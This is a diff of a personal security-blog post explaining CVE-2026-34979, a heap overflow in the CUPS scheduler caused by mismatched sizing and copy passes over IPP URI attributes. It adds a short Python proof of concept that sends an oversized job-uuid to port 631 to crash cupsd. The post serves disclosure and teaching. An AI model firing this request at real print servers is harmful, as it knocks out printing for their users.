@@ -2,156 +2,479 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2026-34979: Heap-based Buffer Overflow in CUPS Scheduler Leads to Denial of Service (DoS) | Research Blog</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="CVE-2026-34979 — cupsd measures an IPP job's attributes one way and copies them another way. The gap between the two is a heap overflow.">
+    <title>Measuring One String, Copying Another: Heap Overflow in CUPS (CVE-2026-34979) | Prabhav Srinath</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
-        body { font-family: 'Inter', sans-serif; }
-        .code-block { background: #f9fafb; color: #111827; padding: 1.5rem; border-radius: 0.375rem; border: 1px solid #e5e7eb; font-family: ui-monospace, monospace; font-size: 0.875rem; line-height: 1.7; overflow-x: auto; margin: 1.5rem 0; }
-        .highlight { color: #dc2626; font-weight: 700; }
-        .comment { color: #6b7280; font-style: italic; }
-        .keyword { color: #b91c1c; font-weight: 800; }
+    /* ---------------------------------------------------------------
+       Minimal Hacker Theme (Clean, Monospace, Terminal-Focused)
+       --------------------------------------------------------------- */
+
+    :root {
+      --bg:        #191b1d;
+      --bg-alt:    #1f2226;
+      --bg-alt2:   #2a2e35;
+      --bg-code:   #141618;
+      --fg:        #c5c8c6;
+      --fg-bright: #f0f0f0;
+      --muted:     #7c828d;
+      --border:    #2a2e35;
+      --green:     #2bbc8a;
+      --pink:      #d480aa;
+      --red:       #dc6a6a;
+      --orange:    #f99157;
+      --yellow:    #e5c07b;
+      --cyan:      #8abeb7;
+      --blue:      #61afef;
+    }
+
+    *, *:before, *:after { box-sizing: border-box; }
+
+    html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      border-top: 2px solid var(--green);
+      -webkit-text-size-adjust: 100%;
+      background-color: var(--bg);
+    }
+
+    body {
+      margin: 0;
+      min-height: 100%;
+      background-color: var(--bg);
+      color: var(--fg);
+      font-weight: 400;
+      font-size: 13.5px;
+      font-family: "JetBrains Mono", "Fira Code", "SFMono-Regular", "Menlo", "Consolas", monospace;
+      line-height: 1.7;
+      text-rendering: optimizeLegibility;
+      -moz-osx-font-smoothing: grayscale;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* scrollbar */
+    * { scrollbar-color: #3e4451 transparent; }
+    *::-webkit-scrollbar { width: 6px; height: 6px; }
+    *::-webkit-scrollbar-track { background: transparent; }
+    *::-webkit-scrollbar-thumb { background-color: #3e4451; border-radius: 3px; }
+    *::-webkit-scrollbar-thumb:hover { background-color: #5c6370; }
+
+    ::selection { background: var(--green); color: var(--bg); }
+
+    /* layout */
+    .max-width { max-width: 48rem; }
+    .mx-auto   { margin-right: auto; margin-left: auto; }
+    .px3       { padding-right: 1.75rem; padding-left: 1.75rem; }
+    .py4       { padding-top: 3.5rem; padding-bottom: 3.5rem; }
+
+    .content {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      min-height: 100%;
+      overflow-wrap: break-word;
+    }
+
+    @media (max-width: 480px) {
+      .px3 { padding-right: 1.25rem; padding-left: 1.25rem; }
+      .py4 { padding-top: 2rem; padding-bottom: 2rem; }
+    }
+
+    /* typography */
+    h1, .h1 {
+      display: block;
+      margin-top: 2.25rem;
+      margin-bottom: 0.75rem;
+      color: var(--green);
+      letter-spacing: -0.01em;
+      font-weight: 700;
+      font-size: 1.3em;
+      line-height: 1.4;
+    }
+
+    h2, .h2 {
+      position: relative;
+      display: block;
+      margin-top: 2.25rem;
+      margin-bottom: 0.75rem;
+      color: var(--fg-bright);
+      font-weight: 700;
+      font-size: 1.05em;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 0.35rem;
+    }
+    h2:before {
+      content: "> ";
+      color: var(--green);
+      opacity: 0.7;
+    }
+
+    h3 {
+      color: var(--yellow);
+      font-weight: 600;
+      font-size: 0.98em;
+      margin-top: 1.5rem;
+      margin-bottom: 0.5rem;
+    }
+    h3:before {
+      content: ":: ";
+      color: var(--cyan);
+      opacity: 0.7;
+    }
+
+    h4 {
+      color: var(--pink);
+      font-weight: 600;
+      font-size: 0.9em;
+      margin-top: 1.2rem;
+      margin-bottom: 0.4rem;
+    }
+
+    p { margin: 0 0 1rem; }
+    @media (min-width: 480px) { p { text-align: justify; } }
+
+    /* links */
+    a {
+      color: var(--fg);
+      text-decoration: none;
+      border-bottom: 1px solid rgba(43, 188, 138, 0.3);
+      transition: all 0.15s ease-in-out;
+    }
+    a:hover {
+      color: var(--green);
+      border-bottom: 1px solid var(--green);
+    }
+
+    /* metadata & badges */
+    .meta {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 1.75rem;
+    }
+
+    .sev {
+      display: inline-block;
+      font-size: 10.5px;
+      font-weight: 700;
+      padding: 1px 5px;
+      border-radius: 2px;
+      vertical-align: middle;
+      font-family: inherit;
+      border: 1px solid transparent;
+    }
+    .sev-critical { background: rgba(220, 106, 106, 0.15); color: var(--red); border-color: rgba(220, 106, 106, 0.4); }
+    .sev-high     { background: rgba(249, 145, 87, 0.15); color: var(--orange); border-color: rgba(249, 145, 87, 0.4); }
+    .sev-medium   { background: rgba(229, 192, 123, 0.15); color: var(--yellow); border-color: rgba(229, 192, 123, 0.4); }
+
+
+    /* meme container */
+    .meme-container {
+      margin: 2rem auto;
+      text-align: center;
+    }
+    .meme-container img {
+      display: block;
+      margin: 0 auto;
+      max-width: 100%;
+      border-radius: 3px;
+      border: 1px solid var(--border);
+    }
+    .meme-caption {
+      font-size: 11.5px;
+      color: var(--muted);
+      font-style: italic;
+      margin-top: 0.45rem;
+    }
+
+    /* tables */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      font-size: 12.5px;
+    }
+    td, th {
+      padding: 6px 10px;
+      border: 1px solid var(--border);
+      text-align: left;
+    }
+    th { background: var(--bg-alt); color: var(--fg-bright); font-weight: 600; }
+
+    /* code & pre */
+    pre {
+      padding: 12px 14px;
+      overflow-x: auto;
+      border: 1px solid var(--border);
+      border-radius: 3px;
+      background: var(--bg-code);
+      font-size: 12.5px;
+      line-height: 20px;
+      color: #abb2bf;
+      text-align: left;
+      margin: 1.2rem 0;
+    }
+    pre code { display: block; padding: 0; border: none; background: none; }
+
+    code {
+      padding: 1px 4px;
+      border: 1px solid var(--border);
+      border-radius: 2px;
+      background: var(--bg-code);
+      font-size: 12px;
+      color: var(--cyan);
+    }
+
+    /* syntax */
+    .c  { color: #5c6370; font-style: italic; }
+    .k  { color: #c678dd; }
+    .s  { color: #98c379; }
+    .n  { color: #d19a66; }
+    .f  { color: #61afef; }
+    .v  { color: #e5c07b; }
+    .hl { color: var(--pink); font-weight: bold; }
+
+    /* header & footer */
+    #header { margin: 0 auto 2.5rem; width: 100%; }
+    #header:after { content: ""; display: table; clear: both; }
+    #header h1 { margin: 0; color: var(--fg-bright); font-weight: 700; font-size: 1.4rem; line-height: 2rem; letter-spacing: -0.01em; }
+    #header a { border-bottom: none; color: inherit; }
+    #header #logo {
+      display: inline-block;
+      float: left;
+      margin-right: 18px;
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background-color: var(--bg-alt2);
+      background-size: cover;
+      border: 1px solid var(--border);
+    }
+    #header #nav { color: var(--green); font-size: 0.82rem; margin-top: 4px; }
+    #header #nav ul { margin: 0; padding: 0; list-style-type: none; line-height: 15px; }
+    #header #nav ul a { margin-right: 12px; color: var(--green); border-bottom: none; }
+    #header #nav ul a:hover { color: var(--pink); border-bottom: 1px dotted var(--pink); }
+    #header #nav ul li { display: inline-block; margin-right: 12px; border-right: 1px solid var(--border); vertical-align: middle; }
+    #header #nav ul li:last-child { margin-right: 0; border-right: 0; }
+
+    /* blinking caret */
+    .caret { color: var(--green); animation: blink 1s step-end infinite; }
+    @keyframes blink { from, to { opacity: 1; } 50% { opacity: 0; } }
+
+    #footer {
+      margin-top: 4rem;
+      margin-bottom: 10px;
+      width: 100%;
+      color: var(--muted);
+      text-align: center;
+      font-size: 11.5px;
+      border-top: 1px solid var(--border);
+      padding-top: 1.5rem;
+    }
+    #footer ul { margin: 0; padding: 0; list-style: none; }
+    #footer li { display: inline-block; margin-right: 12px; border-right: 1px solid var(--border); }
+    #footer li:last-child { margin-right: 0; border-right: 0; }
+    #footer a { color: var(--muted); border-bottom: none; }
+    #footer a:hover { color: var(--fg-bright); border-bottom: 1px dotted var(--fg-bright); }
+
+    @media (min-width: 39rem) {
+      #footer { display: flex; justify-content: space-between; align-items: center; }
+    }
     </style>
 </head>
-<body class="bg-white text-gray-900 antialiased selection:bg-red-100 selection:text-red-900">
-    <div class="max-w-5xl mx-auto py-16 px-6 sm:px-12">
-        
-        <header class="mb-16 border-b border-gray-200 pb-10">
-            <a href="/blog/index.html" class="text-sm font-bold text-gray-500 hover:text-red-600 transition mb-6 inline-block tracking-tight">&larr; Back to Research Index</a>
-            <h1 class="text-4xl md:text-5xl font-extrabold text-gray-900 tracking-tight mb-4">CVE-2026-34979: Heap-based Buffer Overflow in CUPS Scheduler Leads to Denial of Service (DoS)</h1>
-            <div class="flex items-center gap-4 text-xs font-bold text-red-600 uppercase tracking-widest">
-                <span>Vulnerability Research</span>
-                <span class="text-gray-300">|</span>
-                <span class="text-gray-500">April 1, 2026</span>
+<body class="max-width mx-auto px3 ltr">
+
+<div class="content post py4">
+
+    <header id="header">
+        <a href="../index.html">
+            <div id="logo" style="background-image: url(https://avatars.githubusercontent.com/u/122600613?s=400&u=2bb009eea270509b62e5d643bb40d767ac275136&v=4);"></div>
+            <div id="title">
+                <h1>prabhav<span class="caret">_</span></h1>
+            </div>
+        </a>
+        <div id="nav">
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="index.html">Writing</a></li>
+                <li><a href="https://github.com/sprabhav7" target="_blank" rel="noopener">Projects</a></li>
+                <li><a href="https://linkedin.com/in/prabhav-srinath" target="_blank" rel="noopener">LinkedIn</a></li>
+            </ul>
+        </div>
+    </header>
+
+    <article>
+        <header>
+            <h1 class="posttitle">Measuring One String, Copying Another: Heap Overflow in CUPS (CVE-2026-34979)</h1>
+            <div class="meta">
+                <span class="author">Prabhav Srinath</span> |
+                <span class="postdate"><time datetime="2026-04-01">1st April 2026</time></span> |
+                <span>CVE-2026-34979</span> |
+                <span class="sev sev-medium">CVSS 6.9 Medium</span>
             </div>
         </header>
 
-        <main class="space-y-20">
+        <div class="content">
 
-            <section>
-                <div class="bg-gray-50 p-6 rounded-md border border-gray-200 space-y-4">
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                        <div>
-                            <span class="block text-[10px] font-bold text-red-600 uppercase tracking-widest mb-1">CVSS 4.0 Score</span>
-                            <span class="text-xs font-mono font-bold text-gray-900">6.9 (Medium)</span>
-                        </div>
-                        <div>
-                            <span class="block text-[10px] font-bold text-red-600 uppercase tracking-widest mb-1">CWE Identification</span>
-                            <span class="text-xs font-mono font-bold text-gray-900">CWE-122</span>
-                        </div>
-                    </div>
-                    <div class="pt-4 border-t border-gray-200">
-                        <span class="block text-[10px] font-bold text-red-600 uppercase tracking-widest mb-1">CVSS Vector String</span>
-                        <code class="text-xs font-mono text-gray-600 break-all block leading-normal">CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code>
-                    </div>
-                    <div class="pt-4 border-t border-gray-200 grid grid-cols-1 sm:grid-cols-2 gap-4">
-                        <div>
-                            <span class="block text-[10px] font-bold text-red-600 uppercase tracking-widest mb-1">CVE</span>
-                            <span class="text-xs font-mono font-bold text-gray-900">CVE-2026-34979</span>
-                        </div>
-                        <div>
-                            <span class="block text-[10px] font-bold text-red-600 uppercase tracking-widest mb-1">Affected Versions</span>
-                            <span class="text-xs font-mono font-bold text-gray-900">CUPS <= 2.4.16</span>
-                        </div>
-                    </div>
-                </div>
-            </section>
-            
-            <section>
-                <h2 class="text-2xl font-extrabold text-gray-900 mb-6">Summary</h2>
-                <p class="text-base text-gray-700 leading-relaxed max-w-4xl">
-                    The CUPS scheduler (<code>cupsd</code>) was vulnerable to a heap-based buffer overflow corrupting adjacent memory blocks. The flaw resides in how the scheduler calculates the required memory for job attributes versus how it actually serializes them. Specifically, the <code>ipp_length()</code> function fails to account for URI attributes like <code>job-uuid</code>, leading to an undersized allocation in <code>get_options()</code>. An unauthenticated remote attacker can exploit this by sending a crafted IPP request with an overly long <code>job-uuid</code>, resulting in memory corruption, crashing of the scheduler process, creating a Denial of Service (DoS).
-                </p>
-            </section>
+            <h2>TL;DR</h2>
+            <p>
+                The CUPS printing scheduler (<code>cupsd</code>) computes the memory needed for a print job's option buffer by walking its IPP attributes and adding up their lengths in <code>ipp_length()</code>. But there's a catch: it explicitly skips <code>IPP_TAG_URI</code> attributes while calculating the allocation size! Then, when <code>get_options()</code> writes the data into that buffer, it makes an exception for URI attributes like <code>job-uuid</code> and copies them with zero bounds checks. An unauthenticated remote attacker can send an IPP print request with a 32KB <code>job-uuid</code> to trigger an out-of-bounds heap write, corrupting adjacent heap chunks and crashing the daemon into an instant Denial of Service.
+            </p>
 
-            <section>
-                <h2 class="text-2xl font-extrabold text-gray-900 mb-6">Impact</h2>
-                <div class="space-y-8">
-                    <ol class="list-decimal pl-5 space-y-4 text-gray-700 font-medium">
-                        <li><span class="text-gray-900 font-bold">Denial of Service (DoS):</span> The vulnerability is trivial to trigger, allowing any network-adjacent user to crash the printing service.</li>
-                        <li><span class="text-gray-900 font-bold">Heap Corruption:</span> Attacker-controlled data is written past the buffer boundaries, resulting in memory instability and process termination.</li>
-                        <li><span class="text-gray-900 font-bold">Service Disruption:</span> A single malicious payload can disable the printing system for all users until the service is restarted.</li>
-                    </ol>
-                </div>
-            </section>
+            <h2>How I Got Here</h2>
+            <p>
+                I wasn't initially hunting for printer bugs. I was auditing <code>scheduler/job.c</code> while tracing how IPP request attributes get flattened into the environment option string passed downstream to CUPS raster filters. This code has been around for over a decade, surviving countless audits because "someone else must have read it."
+            </p>
+            <p>
+                In C codebases, two-pass buffer serialization is everywhere:
+            </p>
+            <ol>
+                <li><strong>Pass 1:</strong> Walk the linked list of attributes and accumulate the required byte length.</li>
+                <li><strong>Allocation:</strong> Allocate the exact computed size with <code>malloc()</code>.</li>
+                <li><strong>Pass 2:</strong> Walk the attributes again and write the characters into the buffer.</li>
+            </ol>
+            <p>
+                Pass 1 is effectively a contract: <em>"I will only write what I counted here."</em> But in <code>cupsd</code>, Pass 1 and Pass 2 had two completely different opinions on what a URI attribute is worth.
+            </p>
 
-            <section>
-                <h2 class="text-2xl font-extrabold text-gray-900 mb-6">Description</h2>
-                <div class="space-y-6 text-gray-700 leading-relaxed">
-                    <p>
-                        The vulnerability stems from a logical discrepancy between the size calculation and the actual data copy in <code>scheduler/job.c</code>.
-                    </p>
+            <h2>The Vulnerability Deep Dive</h2>
+            <p>
+                Let's inspect the two passes in <code>scheduler/job.c</code> side by side.
+            </p>
 
-                    <h3 class="text-lg font-bold text-gray-900">1. Incorrect Size Calculation</h3>
-                    <p>
-                        The <code>ipp_length()</code> function iterates through attributes to determine the buffer size. It explicitly skips <code>IPP_TAG_URI</code> types, which includes the <code>job-uuid</code> attribute.
-                    </p>
+            <h3>Pass One: The Sizing Pass with a Blind Spot</h3>
+            <p>
+                <code>ipp_length()</code> is responsible for calculating the total byte size needed for the options buffer. Notice line 486:
+            </p>
+            <pre><code><span class="c">// scheduler/job.c — ipp_length()</span>
+<span class="k">for</span> (attr = ipp-&gt;attrs; attr != NULL; attr = attr-&gt;next)
+{
+  <span class="k">if</span> (attr-&gt;value_tag == IPP_TAG_NOVALUE ||
+      <span class="hl">attr-&gt;value_tag == IPP_TAG_URI</span> ||   <span class="c">// ← SKIPPED! ZERO bytes added for URIs!</span>
+      attr-&gt;value_tag == IPP_TAG_URISCHEME)
+    <span class="k">continue</span>;
+  ...
+}</code></pre>
+<div class="meme-container">
+  <img src="https://media.giphy.com/media/BmmfETghGOPrW/giphy.gif" alt="Hangover math meme" style="max-height: 280px;">
+</div>
+            <p>
+                Because <code>job-uuid</code> and <code>job-authorization-uri</code> are tagged as <code>IPP_TAG_URI</code>, <code>ipp_length()</code> contributes <strong>0 bytes</strong> to the total buffer allocation.
+            </p>
 
-                    <div class="code-block">
-                        <span class="comment">// scheduler/job.c</span><br>
-                        <span class="keyword">for</span> (attr = ipp->attrs; attr != NULL; attr = attr->next)<br>
-                        {<br>
-                        &nbsp;&nbsp;<span class="keyword">if</span> (attr->value_tag == IPP_TAG_NOVALUE ||<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="highlight">attr->value_tag == IPP_TAG_URI</span> || <span class="comment">// Skipped!</span><br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;attr->value_tag == IPP_TAG_URISCHEME)<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">continue</span>;<br>
-                        &nbsp;&nbsp;...<br>
-                        }
-                    </div>
+            <h3>Pass Two: The Broken Contract</h3>
+            <p>
+                <code>get_options()</code> allocates the buffer using the undersized return value from <code>ipp_length()</code>. Then, it walks through the attributes to copy them:
+            </p>
+            <pre><code><span class="c">// scheduler/job.c — get_options()</span>
+<span class="k">case</span> IPP_TAG_URI:
+    <span class="k">for</span> (valptr = attr-&gt;values[i].string.text; *valptr;)
+    {
+        <span class="c">// If the character is a delimiter, add a backslash escape</span>
+        <span class="k">if</span> (<span class="f">strchr</span>(<span class="s">" \t\n\\'\""</span>, *valptr))
+            <span class="hl">*optptr++ = '\\';</span>   <span class="c">// ← OUT-OF-BOUNDS HEAP WRITE</span>
+        <span class="hl">*optptr++ = *valptr++;</span>   <span class="c">// ← OUT-OF-BOUNDS HEAP WRITE</span>
+    }
+    *optptr = <span class="s">'\0'</span>;
+    <span class="k">break</span>;</code></pre>
+    <div class="meme-container">
+      <img src="https://media.giphy.com/media/j9djzcMmzg8ow/giphy.gif" alt="Glass overflowing meme" style="max-height: 280px;">
+  </div>
+            <p>
+                Look closely at the loop termination condition: <code>*valptr</code>. It iterates until the input string's null terminator. <strong><code>optptr</code> is never bounds-checked against the allocated buffer boundary!</strong>
+            </p>
+            <p>
+                To make matters even better (from an attacker's perspective), any whitespace, newline, or quote character triggers an extra <code>*optptr++ = '\\'</code>, giving you a <strong>2x amplification factor</strong> on how far past the allocated chunk you write!
+            </p>
 
-                    <h3 class="text-lg font-bold text-gray-900">2. Undersized Allocation & Unsafe Copy</h3>
-                    <p>
-                        In <code>get_options()</code>, the buffer is allocated based on this incorrect length. However, the serialization loop makes an exception for <code>job-uuid</code> and <code>job-authorization-uri</code>, copying them into the buffer without any bounds checking.
-                    </p>
+            <h2>Exploitation Mechanics</h2>
+            <p>
+                Per the IPP protocol specification (RFC 8011), a <code>job-uuid</code> attribute can be up to <strong>32,767 bytes</strong> in length. <code>cupsd</code> does not validate its maximum string length before processing.
+            </p>
+            <ul>
+                <li><strong>Attacker picks the length:</strong> You can choose whether to overflow by 10 bytes, 1,000 bytes, or 32,000 bytes.</li>
+                <li><strong>Attacker controls the content:</strong> You write raw arbitrary bytes (escaped strings) across adjacent heap chunks.</li>
+                <li><strong>Unauthenticated &amp; Remote:</strong> Anyone on the local network (or anyone capable of reaching port 631) can fire an IPP print job without logging in.</li>
+            </ul>
 
-                    <div class="code-block">
-                        <span class="comment">// scheduler/job.c - get_options()</span><br>
-                        <span class="keyword">case</span> IPP_TAG_URI:<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">for</span> (valptr = attr->values[i].string.text; *valptr;)<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;{<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span> (strchr(<span class="highlight">" \t\n\\'\""</span>, *valptr))<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*optptr++ = <span class="highlight">'\\'</span>; <span class="comment">// Overflow!</span><br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*optptr++ = *valptr++; <span class="comment">// Overflow!</span><br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;*optptr = <span class="highlight">'\0'</span>;<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">break</span>;
-                    </div>
+            <h2>Proof of Concept (Triggering DoS)</h2>
+            <p>
+                We can trigger this vulnerability by sending a minimal IPP <code>Create-Job</code> or <code>Print-Job</code> request carrying an oversized <code>job-uuid</code> attribute filled with whitespace:
+            </p>
+            <pre><code><span class="c"># Python snippet constructing an IPP request with a long job-uuid</span>
+<span class="k">import</span> socket
 
-                    <p>
-                        Since <code>job-uuid</code> can be up to 32,767 bytes per the IPP protocol, and <code>cupsd</code> does not validate its length before processing, an attacker has precise control over the overflow size and content, directly leading to heap corruption.
-                    </p>
-                </div>
-            </section>
+ipp_req = (
+    b"\x02\x00"                  <span class="c"># IPP version 2.0</span>
+    b"\x00\x02"                  <span class="c"># Print-Job operation</span>
+    b"\x00\x00\x00\x01"          <span class="c"># Request ID</span>
+    b"\x01"                      <span class="c"># Operation attributes tag</span>
+    b"\x45"                      <span class="c"># IPP_TAG_URI tag</span>
+    b"\x00\x08job-uuid"          <span class="c"># Attribute name</span>
+    b"\x40\x00"                  <span class="c"># 16,384 byte string length</span>
+    + b" " * 16384               <span class="c"># Spaces trigger 2x '\\ ' heap write amplification!</span>
+    + b"\x03"                    <span class="c"># End of attributes tag</span>
+)
 
-            <section>
-                <h2 class="text-2xl font-extrabold text-gray-900 mb-6">Conclusion</h2>
-                <p class="text-base text-gray-700 leading-relaxed mb-6">
-                    This vulnerability highlights the critical importance of size-calculation logic and data-copy logic in synchronization. In the case of CUPS, a single missing tag check in a utility function created an attack vector for out-of-bounds write in the scheduler's heap memory. Users should ensure that CUPS services are not exposed to untrusted networks and as there is no patch from the OpenPrinting project at the time of this blogpost.
-                </p>
-            </section>
+s = socket.socket()
+s.connect((<span class="s">"192.168.1.50"</span>, 631))
+http_post = (
+    f<span class="s">"POST /printers/default HTTP/1.1\r\n"</span>
+    f<span class="s">"Host: 192.168.1.50:631\r\n"</span>
+    f<span class="s">"Content-Type: application/ipp\r\n"</span>
+    f<span class="s">"Content-Length: {len(ipp_req)}\r\n\r\n"</span>
+).encode() + ipp_req
 
-            <section>
-                <h2 class="text-2xl font-extrabold text-gray-900 mb-6">References</h2>
-                <ul class="list-disc pl-5 space-y-2 text-sm text-gray-700 font-medium">
-                    <li>
-                        <a href="https://github.com/OpenPrinting/cups/security/advisories/GHSA-6qxf-7jx6-86fh" class="text-red-600 hover:underline">GitHub Advisory: GHSA-6qxf-7jx6-86fh</a>
-                    </li>
-                    <li>
-                        <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34979" class="text-red-600 hover:underline">NVD Record: CVE-2026-34979</a>
-                    </li>
-                    <li>
-                        <a href="https://www.cve.org/CVERecord?id=CVE-2026-34979" class="text-red-600 hover:underline">CVE.org Record: CVE-2026-34979</a>
-                    </li>
+s.sendall(http_post)
+<span class="c"># Crash: cupsd receives SIGSEGV from heap corruption</span></code></pre>
+
+            <h2>The Fix</h2>
+            <p>
+                The OpenPrinting maintainers resolved this in <strong>CUPS 2.4.17+</strong> by updating <code>ipp_length()</code> to properly account for URI attribute lengths during the allocation sizing pass and ensuring strict bounds checks are enforced when copying attributes in <code>get_options()</code>.
+            </p>
+
+
+            <h2>Takeaways</h2>
+            <p>
+                Whenever an application uses a multi-pass serialization pipeline, the sizing pass and the writing pass must share the exact same tag evaluation logic. In C, whenever a loop writes to a pointer, it must check against the upper bound on every single write, not just rely on the input string terminating.
+            </p>
+
+            <h2>Advisory Telemetry</h2>
+            <table>
+                <tr><th>Field</th><th>Details</th></tr>
+                <tr><td>CVE ID</td><td><a href="https://www.cve.org/CVERecord?id=CVE-2026-34979" target="_blank" rel="noopener">CVE-2026-34979</a></td></tr>
+                <tr><td>CVSS 4.0 Score</td><td><span class="sev sev-medium">6.9 (Medium)</span></td></tr>
+                <tr><td>Vector String</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
+                <tr><td>CWE</td><td>CWE-122: Heap-based Buffer Overflow</td></tr>
+                <tr><td>Affected Software</td><td>CUPS &lt;= 2.4.16</td></tr>
+            </table>
+
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://github.com/OpenPrinting/cups/security/advisories/GHSA-6qxf-7jx6-86fh" target="_blank" rel="noopener">GitHub Advisory: GHSA-6qxf-7jx6-86fh</a></li>
+                <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34979" target="_blank" rel="noopener">NVD CVE-2026-34979 Detail</a></li>
+                <li><a href="https://www.cve.org/CVERecord?id=CVE-2026-34979" target="_blank" rel="noopener">CVE.org Record</a></li>
+            </ul>
+
+        </div>
+    </article>
+
+    <footer id="footer">
+        <div class="footer-left">
+            &copy; 2026 Prabhav Srinath
+        </div>
+        <div class="footer-right">
+            <nav>
+                <ul>
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="index.html">Writing</a></li>
+                    <li><a href="https://github.com/sprabhav7" target="_blank" rel="noopener">Projects</a></li>
+                    <li><a href="https://linkedin.com/in/prabhav-srinath" target="_blank" rel="noopener">LinkedIn</a></li>
                 </ul>
-            </section>
+            </nav>
+        </div>
+    </footer>
 
-            <section class="mt-12">
-                <p class="text-sm text-gray-600 italic">
-                    Special thanks to the OpenPrinting maintainers for their diligence in managing this security disclosure.
-                </p>
-            </section>
-        </main>
-    </div>
+</div>
 </body>
 </html>
